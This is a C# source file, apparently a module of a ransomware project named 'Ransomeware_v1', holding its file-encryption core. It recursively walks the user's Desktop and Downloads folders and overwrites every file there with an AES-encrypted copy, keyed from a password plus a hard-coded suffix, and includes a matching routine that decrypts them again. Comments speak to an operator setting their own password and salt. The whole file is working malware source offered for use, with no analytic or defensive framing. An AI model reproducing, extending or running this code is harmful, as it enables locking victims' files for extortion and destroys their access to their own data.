using System;
using System.Text;
using System.Security.Cryptography;
using System.IO;

namespace Ransomeware_v1.Modules
{
    public class Crypto
    {
        public class CoreEncryption
        {
            public static byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
            {
                byte[] encryptedBytes = null;

                // Set your salt here, change it to meet your flavor:
                // The salt bytes must be at least 8 bytes.
                byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };

                using (MemoryStream ms = new MemoryStream())
                {
                    using (RijndaelManaged AES = new RijndaelManaged())
                    {
                        AES.KeySize = 256;
                        AES.BlockSize = 128;

                        var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
                        AES.Key = key.GetBytes(AES.KeySize / 8);
                        AES.IV = key.GetBytes(AES.BlockSize / 8);

                        AES.Mode = CipherMode.CBC;

                        using (var cs = new CryptoStream(ms, AES.CreateEncryptor(), CryptoStreamMode.Write))
                        {
                            cs.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
                            cs.Close();
                        }
                        encryptedBytes = ms.ToArray();
                    }
                }

                return encryptedBytes;
            }
        }

        public class CoreDecryption
        {
            public static byte[] AES_Decrypt(byte[] bytesToBeDecrypted, byte[] passwordBytes)
            {
                byte[] decryptedBytes = null;

                // Set your salt here, change it to meet your flavor:
                // The salt bytes must be at least 8 bytes.
                byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };

                using (MemoryStream ms = new MemoryStream())
                {
                    using (RijndaelManaged AES = new RijndaelManaged())
                    {
                        AES.KeySize = 256;
                        AES.BlockSize = 128;

                        var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
                        AES.Key = key.GetBytes(AES.KeySize / 8);
                        AES.IV = key.GetBytes(AES.BlockSize / 8);

                        AES.Mode = CipherMode.CBC;

                        using (var cs = new CryptoStream(ms, AES.CreateDecryptor(), CryptoStreamMode.Write))
                        {
                            cs.Write(bytesToBeDecrypted, 0, bytesToBeDecrypted.Length);
                            cs.Close();
                        }
                        decryptedBytes = ms.ToArray();
                    }
                }

                return decryptedBytes;
            }
        }

        public class EncryptionFile
        {
            public void EncryptFile(string file, string password)
            {
                try
                {
                    byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
                    byte[] passwordBytes = Encoding.UTF8.GetBytes(password);

                    // Hash the password with SHA256
                    passwordBytes = SHA256.Create().ComputeHash(passwordBytes);

                    byte[] bytesEncrypted = CoreEncryption.AES_Encrypt(bytesToBeEncrypted, passwordBytes);

                    string fileEncrypted = file;

                    File.WriteAllBytes(fileEncrypted, bytesEncrypted);
                }
                catch
                {
                    Console.WriteLine("Can't access " + file);
                }
            }
        }

        static public void Start_Encrypt(string password) //We see start encrypt files on desktop and download folder
        {
            string path = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            string userRoot = System.Environment.GetEnvironmentVariable("USERPROFILE");
            string downloadFolder = Path.Combine(userRoot, "Downloads");
            string[] files = Directory.GetFiles(path + @"\", "*", SearchOption.AllDirectories);
            string[] files2 = Directory.GetFiles(downloadFolder + @"\", "*", SearchOption.AllDirectories);



            EncryptionFile enc = new EncryptionFile();


            password += "pA8sWo3d193(*&"; //your password

            for (int i = 0; i < files.Length; i++)
            {
                enc.EncryptFile(files[i], password);
                //Console.WriteLine(files[i]);
            }

            for (int i = 0; i < files2.Length; i++)
            {
                enc.EncryptFile(files2[i], password);
                //Console.WriteLine(files[i]);
            }
        }

        static public void OFF_Encrypt(string password) //time to descrypt
        {

            string path = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            string userRoot = System.Environment.GetEnvironmentVariable("USERPROFILE");
            string downloadFolder = Path.Combine(userRoot, "Downloads");
            string[] files = Directory.GetFiles(path + @"\", "*", SearchOption.AllDirectories);
            string[] files2 = Directory.GetFiles(downloadFolder + @"\", "*", SearchOption.AllDirectories);


            DecryptionFile dec = new DecryptionFile();

            password += "pA8sWo3d193(*&";

            for (int i = 0; i < files.Length; i++)
            {
                dec.DecryptFile(files[i], password);
            }

            for (int i = 0; i < files2.Length; i++)
            {
                dec.DecryptFile(files2[i], password);
            }
        }

        public class DecryptionFile
        {
            public void DecryptFile(string fileEncrypted, string password)
            {
                try
                {
                    byte[] bytesToBeDecrypted = File.ReadAllBytes(fileEncrypted);
                    byte[] passwordBytes = Encoding.UTF8.GetBytes(password);
                    passwordBytes = SHA256.Create().ComputeHash(passwordBytes);

                    byte[] bytesDecrypted = CoreDecryption.AES_Decrypt(bytesToBeDecrypted, passwordBytes);

                    string file = fileEncrypted;
                    File.WriteAllBytes(file, bytesDecrypted);
                }
                catch
                {
                    Console.WriteLine("Can't access " + fileEncrypted);
                }
            }
        }
    }
    

}
